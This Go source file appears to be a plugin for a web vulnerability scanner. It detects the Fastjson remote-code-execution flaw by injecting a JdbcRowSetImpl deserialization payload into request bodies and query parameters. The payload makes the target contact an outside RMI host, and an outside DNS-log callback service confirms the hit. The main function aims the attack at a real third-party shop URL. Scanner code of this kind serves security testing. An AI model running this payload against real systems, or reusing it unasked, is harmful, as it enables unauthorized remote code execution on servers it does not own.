/*
url
*/
package main

import (
	"fmt"
	"net/url"
	"strings"
	"time"

	"zeroScannerGo/engine"
	"zeroScannerGo/engine/lib/zhttp"
)

var (
	InitDnsCache = zhttp.SetDnsCache
	dnsUrl       = "http://woshiyingxiong.com:8000/api/dns/fastjson/%s/"
	basePayload  = `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://%s.fastjson.woshiyingxiong.com:8000/obj","autoCommit":true}`
)

func Verify(params engine.Params) (result engine.Result) {
	payload := fmt.Sprintf(basePayload, params.TargetId)

	var err error
	for _, data := range dataToPayload(params.Data, payload) {
		params.Data = data
		result, err = checkVul(params)
		if err != nil || result.Vul {
			return
		}
	}
	for _, query := range dataToPayload(params.ParsedTarget.Query().Encode(), payload) {
		params.ParsedTarget.RawQuery = query
		result, err = checkVul(params)
		if err != nil || result.Vul {
			return
		}
	}
	return
}

func checkVul(params engine.Params) (result engine.Result, err error) {
	var (
		presp      *zhttp.Response
		rawRequest string
	)
	presp, err = zhttp.Request(params.Method, params.ParsedTarget.String(), &zhttp.RequestOptions{
		DialTimeout:        time.Second * 5,
		RequestTimeout:     time.Second * 5,
		RawCookie:          params.Cookie,
		Hosts:              params.Hosts,
		InsecureSkipVerify: true,
		DisableRedirect:    true,
		RawData:            params.Data,
		ContentType:        params.ContentType,
	})
	if err == nil {
		rawRequest = presp.RawRequest()
		presp.Close()
	}

	resp, err := zhttp.Get(fmt.Sprintf(dnsUrl, params.TargetId), &zhttp.RequestOptions{
		DialTimeout:        time.Second * 5,
		RequestTimeout:     time.Second * 5,
		InsecureSkipVerify: true,
		DisableRedirect:    true,
	})
	if err != nil {
		return
	}
	body := resp.String()
	resp.Close()
	if body == "True" {
		result.Vul = true
		result.VulUrl = params.ParsedTarget.String()
		result.VulInfo = "fastjson远程命令执行"
		if rawRequest != "" {
			result.RawReq = rawRequest
		} else {
			result.RawReq = buildRawRequest(params)
		}
	}
	return
}

func buildRawRequest(params engine.Params) string {
	var rawRequest string
	rawRequest += params.Method + " " + strings.TrimPrefix(params.ParsedTarget.String(), params.ParsedTarget.Scheme+"://"+params.ParsedTarget.Host) + " HTTP/1.1\n"
	rawRequest += "Host: " + params.ParsedTarget.Host + "\n"
	rawRequest += "User-Agent: Zhttp/1.0\nX-Scanner: ZERO\n"
	rawRequest += "Cookie: " + params.Cookie + "\n"
	if params.ContentType != "" {
		rawRequest += "Content-Type: " + params.ContentType + "\n"
	}
	if params.Data != "" {
		rawRequest += "\n\n" + params.Data
	}

	return rawRequest
}

func dataToPayload(data string, payload string) []string {
	var result []string
	if data == "" {
		return result
	}
	if strings.HasPrefix(data, "{") && strings.HasSuffix(data, "}") {
		result = append(result, payload)
	} else if strings.HasPrefix(data, "[") && strings.HasSuffix(data, "]") {
		result = append(result, "["+payload+"]")
	} else {
		query, err := url.ParseQuery(data)
		if err != nil {
			return result
		}
		for k, v := range query {
			for i, item := range v {
				var prefix, suffix string
				if strings.HasPrefix(item, "{") && strings.HasSuffix(item, "}") {
					prefix = ""
					suffix = ""
				} else if strings.HasPrefix(item, "[") && strings.HasSuffix(item, "]") {
					prefix = "["
					suffix = "]"
				} else {
					continue
				}
				query[k][i] = prefix + payload + suffix
				result = append(result, query.Encode())
				query[k][i] = item
			}
		}
	}
	return result
}

func main() {
	params := engine.Params{}
	params.Method = "POST"
	params.ContentType = "application/x-www-form-urlencoded"
	params.Data = "queryStr=%7B%22tabIndex%22%3A%220%22%7D&"
	params.Target = "https://arbit.shop.jd.com/consultJson/consultJsonAction_getTabCounts.action"
	parsedTarget, _ := url.Parse(params.Target)
	params.ParsedTarget = *parsedTarget

	result := Verify(params)
	fmt.Printf("%+v\r\n", result)
}
